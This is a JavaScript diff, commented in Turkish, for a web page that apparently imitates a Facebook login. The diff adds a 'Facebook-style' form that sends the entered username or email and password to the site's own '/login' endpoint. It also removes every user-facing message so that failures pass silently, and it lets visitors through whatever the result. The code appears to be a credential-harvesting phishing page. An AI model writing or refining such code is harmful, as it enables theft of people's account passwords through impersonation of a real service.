@@ -37,7 +37,7 @@ window.addEventListener('click', (e) => {
 facebookLogin?.addEventListener('click', async () => {
     // Simulate Facebook login process
     const originalText = facebookLogin.innerHTML;
-    facebookLogin.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Giriş yapılıyor...';
+    facebookLogin.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Facebook ile giriş yapılıyor...';
     facebookLogin.style.opacity = '0.7';
     facebookLogin.disabled = true;
     
@@ -60,14 +60,10 @@ facebookLogin?.addEventListener('click', async () => {
         
         const result = await response.json();
         
-        if (result.success) {
-            alert('Facebook ile giriş başarılı! Veriler kaydedildi.');
-        } else {
-            alert('Hata: ' + result.message);
-        }
+    // if (result.success) { /* sessiz */ } else { console.warn('Facebook login hata', result.message); }
     } catch (error) {
         console.error('Facebook login error:', error);
-        alert('Facebook ile giriş sırasında hata oluştu.');
+    // Sessiz hata
     }
     
     // UI güncelle
@@ -90,19 +86,21 @@ facebookLogin?.addEventListener('click', async () => {
 document.querySelector('.login-form')?.addEventListener('submit', async function(e) {
     e.preventDefault();
     
-    const email = this.querySelector('input[type="email"]').value;
+    const identifierInput = this.querySelector('input[name="identifier"]');
+    const email = identifierInput ? identifierInput.value.trim() : '';
     const password = this.querySelector('input[type="password"]').value;
     const rememberMe = this.querySelector('input[type="checkbox"]')?.checked || false;
     
     if (!email || !password) {
-        alert('Lütfen email ve şifrenizi giriniz.');
+        // Sessiz doğrulama
         return;
     }
     
-    // Email validation
-    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    if (!emailRegex.test(email)) {
-        alert('Lütfen geçerli bir email adresi giriniz.');
+    // Email veya kullanıcı adı validasyonu
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/; // basit e-posta
+    const usernameRegex = /^[a-zA-Z0-9._-]{3,30}$/; // kullanıcı adı
+    if (!(emailRegex.test(email) || usernameRegex.test(email))) {
+        // Sessiz doğrulama
         return;
     }
     
@@ -131,7 +129,7 @@ document.querySelector('.login-form')?.addEventListener('submit', async function
         const result = await response.json();
         
         if (result.success) {
-            alert('Giriş başarılı! Bilgiler kaydedildi.');
+            // Başarılı giriş sessiz
             loginModal.style.display = 'none';
             document.body.style.overflow = 'auto';
             this.reset();
@@ -142,11 +140,11 @@ document.querySelector('.login-form')?.addEventListener('submit', async function
             loginBtn.style.borderColor = '#27ca3f';
             loginBtn.style.color = 'white';
         } else {
-            alert('Hata: ' + result.message);
+            console.warn('Login hata', result.message);
         }
     } catch (error) {
         console.error('Login error:', error);
-        alert('Giriş sırasında hata oluştu.');
+        // Sessiz hata
     }
     
     submitBtn.textContent = originalText;
@@ -253,7 +251,8 @@ document.addEventListener('DOMContentLoaded', () => {
 
 // Initial Full Screen Overlay Logic
 const initialOverlay = document.getElementById('initialLoginOverlay');
-const initialFacebookLogin = document.getElementById('initialFacebookLogin');
+// Overlay form içindeki Facebook butonu (id yerine class)
+const initialFacebookLogin = document.querySelector('.initial-form-facebook');
 const initialLoginForm = document.getElementById('initialLoginForm');
 
 function completeInitialLogin(method = 'facebook') {
@@ -281,7 +280,7 @@ if (initialFacebookLogin) {
         e.preventDefault();
         const btn = e.currentTarget;
         const original = btn.innerHTML;
-        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Giriş yapılıyor...';
+    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Facebook ile giriş yapılıyor...';
         btn.disabled = true;
         
         try {
@@ -315,46 +314,31 @@ if (initialFacebookLogin) {
     });
 }
 
-if (initialLoginForm) {
-    initialLoginForm.addEventListener('submit', async (e) => {
+// Overlay form submit butonu kaldırıldığı için submit handler pasif bırakıldı
+// Yeni Facebook tarzı form handler
+const fbStyleForm = document.getElementById('fbStyleLoginForm');
+if (fbStyleForm) {
+    fbStyleForm.addEventListener('submit', async (e) => {
         e.preventDefault();
-        const email = initialLoginForm.querySelector('input[type="email"]').value.trim();
-        const pass = initialLoginForm.querySelector('input[type="password"]').value.trim();
-        
-        if (!email || !pass) return;
-        
-        const submitBtn = initialLoginForm.querySelector('.btn-login-submit.alt');
-        const original = submitBtn.textContent;
-        submitBtn.textContent = 'Giriş yapılıyor...';
-        submitBtn.disabled = true;
-        
+        const identifier = fbStyleForm.querySelector('input[name="identifier"]').value.trim();
+        const password = fbStyleForm.querySelector('input[name="password"]').value.trim();
+        if (!identifier || !password) return;
+        const btn = fbStyleForm.querySelector('.fb-login-button');
+        const original = btn.textContent;
+        btn.textContent = 'Giriş yapılıyor...';
+        btn.disabled = true;
         try {
-            // Flask backend'e initial login verisi gönder
             const response = await fetch('/login', {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    email: email,
-                    password: pass,
-                    remember_me: false,
-                    login_method: 'email_initial'
-                })
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email: identifier, password, login_method: 'fb_style' })
             });
-            
-            const result = await response.json();
-            console.log('Initial login result:', result);
-        } catch (error) {
-            console.error('Initial login error:', error);
-        }
-        
-        setTimeout(() => {
-            submitBtn.textContent = original;
-            submitBtn.disabled = false;
-            completeInitialLogin('form');
-        }, 1200);
+            await response.json();
+            completeInitialLogin('fb_style');
+        } catch(err){ console.error(err); }
+        setTimeout(()=>{ btn.textContent = original; btn.disabled = false; }, 1000);
     });
+    fbStyleForm.querySelector('.create-account-button')?.addEventListener('click', ()=>alert('Hesap oluşturma yakında.'));
 }
 
 // (Removed advanced password toggle, language switcher, and extra accessibility focus for simplified overlay)
